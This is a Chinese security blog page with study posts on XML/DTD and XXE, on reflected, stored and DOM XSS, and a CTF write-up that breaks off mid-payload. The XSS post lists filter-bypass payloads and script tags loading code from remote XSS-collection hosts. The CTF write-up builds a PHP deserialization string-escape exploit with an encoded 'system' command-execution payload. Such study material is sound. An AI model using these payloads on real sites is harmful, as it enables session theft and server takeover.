<p><strong>HTML 被设计用来显示数据。</strong></p>
<p>###基本语法</p>
<blockquote>
<p>所有 XML 元素都须有关闭标签<br> XML 标签对大小写敏感<br> XML 文档必须有根元素<br> XML 的属性值须加引号</p>
</blockquote>

        <h3 id="实体引用">
          <a href="#实体引用" class="heading-link"><i class="fas fa-link"></i></a><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h3>
      <p><img src="/2023/08/20/Xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/AAwangzhan\1\hexoblog\source\image\20200904173922834.png"></p>
<p>##DTD介绍</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.w3school.com.cn/dtd/dtd_intro.asp">DTD介绍</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><strong>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</strong></p>
<p><strong>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p>
<p>内部的 DOCTYPE 声明</p>
<p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></div></figure>

<p>带有 DTD 的 XML 文档实例（请在 IE5 以及更高的版本打开，并选择查看源代码）：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></div></figure>

<p><em>!DOCTYPE note</em> (第二行)定义此文档是 <em>note</em> 类型的文档。</p>
<p><em>!ELEMENT note</em> (第三行)定义 <em>note</em> 元素有四个元素：”to、from、heading,、body”</p>
<p><em>!ELEMENT to</em> (第四行)定义 <em>to</em> 元素为 “#PCDATA” 类型</p>
<p><em>!ELEMENT from</em> (第五行)定义 <em>from</em> 元素为 “#PCDATA” 类型</p>
<p><em>!ELEMENT heading</em> (第六行)定义 <em>heading</em> 元素为 “#PCDATA” 类型</p>
<p><em>!ELEMENT body</em> (第七行)定义 <em>body</em> 元素为 “#PCDATA” 类型</p>
<p>###外部文档声明</p>
<p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></div></figure>

<p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: （<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.w3school.com.cn/dtd/note_ex_dtd.xml">在 IE5 中打开</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，并选择“查看源代码”命令。）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></div></figure>

<p>这是包含 DTD 的 “note.dtd” 文件：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></div></figure>

<p>附上实例：</p>
<pre><code>内部实体声明
DTD 实例:
&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt; &lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;

XML 实例：&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;

外部实体声明
DTD 实例:
&lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt; &lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;

XML 实例:&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;
</code></pre>
<p>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号（;）</p>
<p>xxe主要是利用了DTD引用外部实体导致的漏洞</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">XSS跨站脚本注入攻击</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-17</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>#XSS跨站脚本注入攻击</p>
<p>跨站脚本(Cross-site Scripting )攻击，攻击者通过网站注入点注入客户端可执行解析的payload(脚本代码），当用户访问网页时，恶意payload自动加载并执行，以达到攻击者目的（窃取cookie、恶意传播、钓鱼欺骗等）。<br>为了避免与HTML语言中的CSS相混淆，通常称它为”XSS”。</p>
<p>XSS分为：存储型 、反射型 、DOM型XSS</p>
<p>###反射性XSS</p>
<p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/AAwangzhan\1\hexoblog\source\image\image-20230915195201845.png"></p>
<p>非持久化，仅执行一次，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面<br>DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。<br>攻击流程：攻击者-&gt;发现存在反射性XSS-&gt;根据输出点环境构造xss代码-&gt;进行代码缩短（可有可无，仅为了增加迷惑性）-&gt;发送给受害者-&gt;受害者点开链接，xss代码执行完成攻击者代码工具。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;hello,输入后会变成一级标题</span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/AAwangzhan\1\hexoblog\source\image\image-20230916112206026.png"></p>
<p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/AAwangzhan\1\hexoblog\source\image\image-20230916112226123.png"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">过滤&lt;script&gt;,换为空</span><br><span class="line">&lt;sc&lt;script&gt;ript&gt;alert（1）&lt;/script&gt;</span><br><span class="line">换完之后为&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">匹配大小写</span><br><span class="line">&lt;Script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">对标签&lt;script&gt;进行过滤,可以用其他标签</span><br><span class="line">&lt;img src=1 onerror =alert(1)/&gt;</span><br><span class="line">防御：</span><br><span class="line">html转换字符</span><br><span class="line">$name=ntmlspecialchars($name)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>ctfhub </p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt sRC=//0x.ax/J5ddFe&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></div></figure>


        <h3 id="存储型XSS">
          <a href="#存储型XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3>
      <p>特点：持久型</p>
<p>主要存在以攻击者将额恶意脚本存储到服务器的数据库中，当用户访问包含恶意相关数据的页面时，服务端未经严个过滤处理而输出在用户的浏览器中，导致浏览器执行代码数据</p>
<p>多见于评论留言框处</p>
<script>alert(1)</script>服务器将它存储于数据库中，每次访问都会进行弹窗，没次都是从数据库里查询这条语句，并且显示出来，

<p>影响范围广，每个人访问这个网站都会从数据库提取信息</p>
<p>防御：</p>
<blockquote>
<p>trim(string[, charlist]):<br>函数移除字符串两侧的空白字符或预定义字符( \t. \n.\xOB、\r)stripslashes(string) :<br>移除字符串中的反斜杠<br>mysqli_real_escape_string(connection, string) :<br>对字符串中sql的特殊符号(ixoo , \n , lr , ,，”, x1a )进行转义<br>strip_tags(string, allow)函数剥去字符串中的HTML、XML以及 PHP的标签;<br>addslashes(string)返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串;还有最后一道htmlspecialchars()函数，让你不得翻身。</p>
</blockquote>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&#x27;&quot;&gt;&lt;sCRiPt sRC=https://0x.ax/J5ddFe&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></div></figure>


        <h3 id="DOM型XSS">
          <a href="#DOM型XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3>
      <p>特点：通过JavaScript操作document，实现dom数的重构</p>
<p>主要存在与用户能修页面的dom，造成客户端playload在浏览器中运行</p>
<p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/AAwangzhan\1\hexoblog\source\image\image-20230916142202534.png"></p>
<p>关键代码</p>
<p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/AAwangzhan\1\hexoblog\source\image\image-20230916142627972.png"></p>
<p>现在第一个框提交’; <sCRiPt src="//xss.pt/J5ddFe">//</p>
<p>根据源码';将框起来的语句闭合，后面呢//会注释，将与前面<sCrIpT>闭合</p>
<sCRiPt sRC=//xss.pt/J5ddFe>//又与前面闭合


</sCrIpT></sCRiPt></p></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/">2023巅峰极客 Unserialize  Wp</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="2023巅峰极客-unserialize-wp">
          <a href="#2023巅峰极客-unserialize-wp" class="heading-link"><i class="fas fa-link"></i></a><a href="#2023巅峰极客-unserialize-wp" class="headerlink" title="2023巅峰极客 unserialize  wp"></a>2023巅峰极客 unserialize  wp</h1>
      <p>后台扫描发现<img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/AAwangzhan\1\hexoblog\source\image\image-20230810173524265.png"></p>
<p>访问<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://www.zip下载拿到源码my.php/">www.zip下载拿到源码my.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class pull_it &#123;</span><br><span class="line">    private $x;</span><br><span class="line"></span><br><span class="line">​    function __construct($xx) &#123;</span><br><span class="line">​       $this-&gt;x = $xx;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    function __destruct() &#123;</span><br><span class="line">​       if ($this-&gt;x) &#123;</span><br><span class="line">​          $preg_match = &#x27;return preg_match(&quot;/[A-Za-z0-9]+/i&quot;, $this-&gt;x);&#x27;;</span><br><span class="line">​       if (eval($preg_match)) &#123;</span><br><span class="line">​          echo $preg_match;</span><br><span class="line">​          exit(&quot;save_waf&quot;);</span><br><span class="line">​       &#125;</span><br><span class="line">​       @eval($this-&gt;x);</span><br><span class="line">​       &#125;</span><br><span class="line">​    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">class push_it &#123;</span><br><span class="line">​    private $root;</span><br><span class="line">​    private $pwd;</span><br><span class="line"></span><br><span class="line">​    function __construct($root, $pwd) &#123;</span><br><span class="line">​       $this-&gt;root = $root;</span><br><span class="line">​       $this-&gt;pwd = $pwd;</span><br><span class="line">​    &#125;</span><br><span class="line">​    </span><br><span class="line">​       function __destruct() &#123;</span><br><span class="line">​       unset($this-&gt;root);</span><br><span class="line">​       unset($this-&gt;pwd);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    function __toString() &#123;</span><br><span class="line">​       if (isset($this-&gt;root) &amp;&amp; isset($this-&gt;pwd)) &#123;</span><br><span class="line">​          echo &quot;&lt;h1&gt;Hello, $this-&gt;root&lt;/h1&gt;&quot;;</span><br><span class="line">​       &#125;</span><br><span class="line">​       else &#123;</span><br><span class="line">​          echo &quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;;</span><br><span class="line">​       &#125;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>


<p>​    index.php</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;login.html&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$root</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">    <span class="variable">$login</span> = <span class="keyword">new</span> <span class="title function_ invoke__">push_it</span>(<span class="variable">$root</span>, <span class="variable">$pwd</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="title function_ invoke__">b</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$login</span>));</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=`./login.php`;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>function.php</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;bbbbbb&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bbbbbb&#x27;</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>my.php里的pull_it是恶意类，能控制$this-&gt;x就能命令执行，这里是无字母数字命令执行</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$root</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pwd</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$root</span>, <span class="variable">$pwd</span></span>) </span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;root = <span class="variable">$root</span>;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;pwd = <span class="variable">$pwd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;root);</span><br><span class="line">   <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;pwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;root) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;pwd)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Hello, <span class="subst">$this</span>-&gt;root&lt;/h1&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>index.php里对传入的参数先做序列化存储在$_SESSION里，并用b函数替换字符</p>
<p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/AAwangzhan\1\hexoblog\source\image\image-20230810174134098.png"></p>
<p>当访问login.php时，会先替换字符再做反序列化</p>
<p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/AAwangzhan\1\hexoblog\source\image\image-20230810174205139.png"></p>
<p>a函数和b函数都是字符串替换，数量不一致很明显存在字符串逃逸。一个是b字符串由短变长，第二个a函数是由长变短，我们这里利用a函数</p>
<p>自己的做法：</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$root</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pwd</span>=<span class="string">&#x27;qwe&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">push_it</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;    </span><br><span class="line"><span class="comment">//O:7:&quot;push_it&quot;:2:&#123;s:13:&quot;%00push_it%00root&quot;;s:4:&quot;root&quot;;s:12:&quot;%00push_it%00pwd&quot;;s:3:&quot;qwe&quot;;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<blockquote>
<p>O:7:”push_it”:2:{s:13:”%00push_it%00root”;s:4:”root”;s:12:”%00push_it%00pwd”;s:3:”qwe”;}我们利用这个来逃逸</p>
<p>O:7:”push_it”:2:{s:13:”%00push_it%00root”;s:4:”root**”;s:12:”%00push_it%00pwd”;s:3:”*<em>qwe”;}可以利用的加粗字符数一数有28位，我们就一共要逃逸28个字符，a函数没执行一次会多2位，所以需要重复14次   14</em>6&#x3D;84个b</p>
</blockquote>
<p>然后我们要进行构造pwd，pull_it里过滤了超多，是无字符数字rce，这里用到取反</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$x</span>=<span class="string">&quot;(~&quot;</span>.~<span class="string">&quot;system&quot;</span>.<span class="string">&quot;)(~&quot;</span>.~<span class="string">&quot;cat /f*&quot;</span>.<span class="string">&quot;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">pull_it</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:7:&quot;pull_it&quot;:1:&#123;s:10:&quot; pull_it x&quot;;s:20:&quot;(~������)(~����Й�);&quot;;&#125;</span></span><br></pre></td></tr></table></div></figure>

<p>我们现在已经知道了pull_it序列化后字符串的形式了，接下来我们只需要闭合push_it序列化字符串前面的符号即可：</p>
<p>前面逃逸出来的这些字符已经变成username串中的一部分了，我们在pwd中也需要加入这些进行闭合（这里的%00我们不能直接这么写，需要编码后才为%00，所以我们可以先写成\000，这个是8进制的写法，然后编码之后就能转为%00，但是在php中需要使用双引号才能识别\000）<br>“;s:12:”%00push_it%00pwd”;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;\&quot;;s:12:\&quot;\000push_it\000pwd\&quot;;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">pull_it</span>(<span class="string">&quot;(~&quot;</span>.~<span class="string">&quot;system&quot;</span>.<span class="string">&quot;)(~&quot;</span>.~<span class="string">&quot;cat /f*&quot;</span>.<span class="string">&quot;);&quot;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>push_it%<span class="number">00</span>pwd%<span class="number">22</span>%<span class="number">3</span>BO%<span 